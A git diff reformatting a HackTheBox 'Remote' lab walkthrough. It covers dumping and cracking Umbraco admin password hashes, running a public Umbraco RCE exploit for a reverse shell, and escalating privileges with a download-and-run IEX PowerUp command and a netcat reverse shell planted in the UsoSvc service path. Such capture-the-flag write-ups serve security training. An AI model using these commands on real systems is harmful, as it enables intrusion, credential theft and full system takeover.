@@ -248,199 +248,128 @@ root@lifesfun:~# ls
 cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
 ```
 
-root\@lifesfun:\~\# strings Umbraco.sdf
-
+Strings utility can be used to partially enumerate the contents of the database. Only a few top lines are shown below.
+```
+root@lifesfun:~# strings Umbraco.sdf 
 Administratoradmindefaulten-US
-
 Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
-
 Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+```
 
-adminadmin\@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin\@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
-
-adminadmin\@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin\@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
-
-smithsmith\@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith\@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
-
-ssmithsmith\@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith\@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
-
-ssmithssmith\@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith\@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+It looks like there are a few lines with what could be a username and a hashed password - admin:b8be16afba8c314ad33d812f22a04991b90e2aaa . The algorithm used to hash the password is SHA1.
 
 ### Hash Cracking
 
-.\\hashcat64.exe -m 100 -a 0 .\\remote.txt .\\rockyou.txt
+Hashcat can be used to obtain the password from the hash shown above.
 
+```
+.\hashcat64.exe -m 100 -a 0 .\remote.txt .\rockyou.txt
 hashcat (v5.1.0) starting...
 
-\* Device \#1: WARNING! Kernel exec timeout is not disabled.
-
-This may cause "CL_OUT_OF_RESOURCES" or related errors.
-
-To disable the timeout, see: https://hashcat.net/q/timeoutpatch
-
-\* Device \#2: Intel's OpenCL runtime (GPU only) is currently broken.
-
-We are waiting for updated OpenCL drivers from Intel.
-
-You can use --force to override, but do not report related errors.
-
-nvmlDeviceGetFanSpeed(): Not Supported
-
-OpenCL Platform \#1: NVIDIA Corporation
-
+OpenCL Platform #1: NVIDIA Corporation
 ======================================
+* Device #1: GeForce, 1024/4096 MB allocatable, 5MCU
 
-\* Device \#1: GeForce GTX 1050, 1024/4096 MB allocatable, 5MCU
-
-OpenCL Platform \#2: Intel(R) Corporation
-
+OpenCL Platform #2: Intel(R) Corporation
 ========================================
-
-\* Device \#2: Intel(R) HD Graphics 630, skipped.
+* Device #2: Intel(R) HD Graphics, skipped.
 
 Hashes: 1 digests; 1 unique digests, 1 unique salts
-
 Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-
 Rules: 1
 
 Applicable optimizers:
-
-\* Zero-Byte
-
-\* Early-Skip
-
-\* Not-Salted
-
-\* Not-Iterated
-
-\* Single-Hash
-
-\* Single-Salt
-
-\* Raw-Hash
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
 
 Minimum password length supported by kernel: 0
-
 Maximum password length supported by kernel: 256
-
-ATTENTION! Pure (unoptimized) OpenCL kernels selected.
-
-This enables cracking passwords and salts \> length 32 but for the price of
-drastically reduced performance.
-
-If you want to switch to optimized OpenCL kernels, append -O to your
-commandline.
 
 Watchdog: Temperature abort trigger set to 90c
 
 Dictionary cache hit:
+* Filename..: .\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
 
-\* Filename..: .\\rockyou.txt
-
-\* Passwords.: 14344384
-
-\* Bytes.....: 139921497
-
-\* Keyspace..: 14344384
-
-Driver temperature threshold met on GPU \#1. Expect reduced performance.
-
+Driver temperature threshold met on GPU #1. Expect reduced performance.
 b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
 
 Session..........: hashcat
-
 Status...........: Cracked
-
 Hash.Type........: SHA1
-
 Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
-
 Time.Started.....: Sun Aug 23 12:57:06 2020 (1 sec)
-
 Time.Estimated...: Sun Aug 23 12:57:07 2020 (0 secs)
-
-Guess.Base.......: File (.\\rockyou.txt)
-
+Guess.Base.......: File (.\rockyou.txt)
 Guess.Queue......: 1/1 (100.00%)
-
-Speed.\#1.........: 8595.7 kH/s (2.65ms) \@ Accel:1024 Loops:1 Thr:64 Vec:1
-
+Speed.#1.........:  8595.7 kH/s (2.65ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
-
 Progress.........: 9830400/14344384 (68.53%)
-
 Rejected.........: 0/9830400 (0.00%)
-
 Restore.Point....: 9502720/14344384 (66.25%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: bounty11 -> babypolk07
+Hardware.Mon.#1..: Temp: 48c Util: 42% Core:1468MHz Mem:2504MHz Bus:16
 
-Restore.Sub.\#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-
-Candidates.\#1....: bounty11 -\> babypolk07
-
-Hardware.Mon.\#1..: Temp: 48c Util: 42% Core:1468MHz Mem:2504MHz Bus:16
-
-Driver temperature threshold met on GPU \#1. Expect reduced performance.
-
-[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\> Started: Sun Aug 23 12:56:59
-2020
-
+Driver temperature threshold met on GPU #1. Expect reduced performance.
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => Started: Sun Aug 23 12:56:59 2020
 Stopped: Sun Aug 23 12:57:08 2020
 
-\---------------------------------
+---------------------------------
+```
 
-It seems now there's a username and a password that can be used.
+Now there's a username and a password that can be used - admin:baconandcheese.
 
 Low Privilege Exploitation
 --------------------------
 
-![](media/e88770d913725c5f63074e2c06fedd42.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Remote%20Walkthrough/media/e88770d913725c5f63074e2c06fedd42.png?raw=true)
 
-Upon logging in, a version of the application has been discovered. This can be
+Upon logging in, the version of the application has been discovered. This can be
 used to find an exploit.
 
 A quick google search presents a number of exploits available.
 
-![](media/75da944457b1eb8c3b6c76b381245163.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Remote%20Walkthrough/media/75da944457b1eb8c3b6c76b381245163.png?raw=true)
 
-Jonoans’ exploit has been chosen and downloaded from github as per commands
-below.
+Jonoans’ exploit has been chosen and downloaded from github as per commands below.
 
-root\@lifesfun:\~\# git clone https://github.com/Jonoans/Umbraco-RCE.git
-
+```
+root@lifesfun:~# git clone https://github.com/Jonoans/Umbraco-RCE.git
 Cloning into 'Umbraco-RCE'...
-
 remote: Enumerating objects: 29, done.
-
 remote: Counting objects: 100% (29/29), done.
-
 remote: Compressing objects: 100% (20/20), done.
-
 remote: Total 29 (delta 13), reused 23 (delta 7), pack-reused 0
+Unpacking objects: 100% (29/29), 14.54 KiB | 465.00 KiB/s, done.
 
-Unpacking objects: 100% (29/29), 14.54 KiB \| 465.00 KiB/s, done.
-
-root\@lifesfun:\~\# pip3 install -r requirements.txt
+root@lifesfun:~# pip3 install -r requirements.txt
+```
 
 After all of the requirements have been installed, the exploit is ran, the
 reverse shell has been established and the user flag obtained.
 
-root\@lifesfun:\~\# python3 exploit.py -u admin\@htb.local -p baconandcheese -w
-'http://10.10.10.180/' -i 10.10.14.224
-
+```
+root@lifesfun:~# python3 exploit.py -u admin@htb.local -p baconandcheese -w 'http://10.10.10.180/' -i 10.10.14.224
 [+] Trying to bind to 0.0.0.0 on port 4444: Done
-
-[+] Waiting for connections on 0.0.0.0:4444: Got connection from 10.10.10.180 on
-port 49697
-
+[+] Waiting for connections on 0.0.0.0:4444: Got connection from 10.10.10.180 on port 49697
 [+] Trying to bind to 0.0.0.0 on port 4445: Donewi
-
-[+] Waiting for connections on 0.0.0.0:4445: Got connection from 10.10.10.180 on
-port 49698
-
-[\*] Switching to interactive mode
-
-PS C:\\windows\\system32\\inetsrv\> type C:\\Users\\Public\\user.txt
+[+] Waiting for connections on 0.0.0.0:4445: Got connection from 10.10.10.180 on port 49698
+[*] Switching to interactive mode
+PS C:\windows\system32\inetsrv> type C:\Users\Public\user.txt
+```
 
 Privilege Escalation
 --------------------
@@ -449,85 +378,89 @@ For privilege escalation PowerUp, a script written by HarmJ0y, is used for quick
 enumeration of some easy vectors. It presents us a service with weak
 permissions.
 
-PS C:\\windows\\system32\\inetsrv\> IEX (New-Object
-Net.WebClient).DownloadString('http://10.10.14.224/PowerUp.ps1')
+```
+PS C:\windows\system32\inetsrv> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.224/PowerUp.ps1')
+PS C:\windows\system32\inetsrv> Invoke-AllChecks
 
-PS C:\\windows\\system32\\inetsrv\> Invoke-AllChecks
+[*] Running Invoke-AllChecks
 
-[\*] Running Invoke-AllChecks
 
-[\*] Checking if user is in a local group with administrative privileges...
+[*] Checking if user is in a local group with administrative privileges...
 
-[\*] Checking for unquoted service paths...
 
-[\*] Checking service executable permissions...
+[*] Checking for unquoted service paths...
 
-[\*] Checking service permissions...
 
-[\*] Use 'Invoke-ServiceUserAdd -ServiceName SVC' or 'Invoke-ServiceCMD' to
-abuse
+[*] Checking service executable permissions...
 
-[+] Vulnerable service: UsoSvc - C:\\Windows\\system32\\svchost.exe -k netsvcs
--p
 
-[\*] Checking for unattended install files...
+[*] Checking service permissions...
+[*] Use 'Invoke-ServiceUserAdd -ServiceName SVC' or 'Invoke-ServiceCMD' to abuse
 
-[\*] Checking %PATH% for potentially hijackable .dll locations...
+[+] Vulnerable service: UsoSvc - C:\Windows\system32\svchost.exe -k netsvcs -p
 
-[\*] Checking for AlwaysInstallElevated registry key...
 
-[\*] Checking for Autologon credentials in registry...
+[*] Checking for unattended install files...
 
-[\*] Checking for encrypted web.config strings...
 
-[\*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+[*] Checking for Autologon credentials in registry...
+
+
+[*] Checking for encrypted web.config strings...
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+```
 
 To abuse these permissions netcat is downloaded to the vicitm’s system as shown
 below.
 
-PS C:\\windows\\system32\\inetsrv\> cd C:\\inetpub\\wwwroot
-
-PS C:\\inetpub\\wwwroot\> wget "http://10.10.14.224/nc.exe" -outfile "nc.exe"
+```
+PS C:\windows\system32\inetsrv> cd C:\inetpub\wwwroot
+PS C:\inetpub\wwwroot> wget "http://10.10.14.224/nc.exe" -outfile "nc.exe"
+```
 
 Once the netcat is downloaded, sc.exe can be used to modify binpath of the
 service and insert above download nc executable with reverse shell command
 pointing to the attacking machine.
 
-PS C:\\inetpub\\wwwroot\> sc.exe config UsoSvc binpath=
-"C:\\inetpub\\wwwroot\\nc.exe -nv 10.10.14.224 8080 -e
-C:\\WINDOWS\\System32\\cmd.exe"
-
+```
+PS C:\inetpub\wwwroot> 
+sc.exe config UsoSvc binpath= "C:\inetpub\wwwroot\nc.exe -nv 10.10.14.224 8080 -e C:\WINDOWS\System32\cmd.exe"
 [SC] ChangeServiceConfig SUCCESS
+```
 
 After the modifications to the service are done the service needs to be
 restarted. However, before restarting the service make sure that netcat is
 listening on the attacker machine. As shown below, first stop the service and
 then start the service again.
 
-PS C:\\inetpub\\wwwroot\> net stop UsoSvc
-
+```
+PS C:\inetpub\wwwroot> net stop UsoSvc
 The Update Orchestrator Service service is stopping.
-
 The Update Orchestrator Service service was stopped successfully.
 
-PS C:\\inetpub\\wwwroot\> net start UsoSvc
+PS C:\inetpub\wwwroot> net start UsoSvc
+```
 
 Once the service is restarted the reverse shell command should be executed with
 netcat on victim’s machine and the netcat on attacker’s machine should receive
 it as show below.
 
-root\@lifesfun:\~\# nc -nvlp 8080
-
+```
+root@lifesfun:~# nc -nvlp 8080
 listening on [any] 8080 ...
-
 connect to [10.10.15.156] from (UNKNOWN) [10.10.10.180] 49757
-
 Microsoft Windows [Version 10.0.17763.107]
-
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\\Windows\\system32\>type C:\\Users\\Administrator\\Desktop\\root.txt
-
-type C:\\Users\\Administrator\\Desktop\\root.txt
-
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
 29c16c8e6518ae7aacee614fe6e1c599
+```
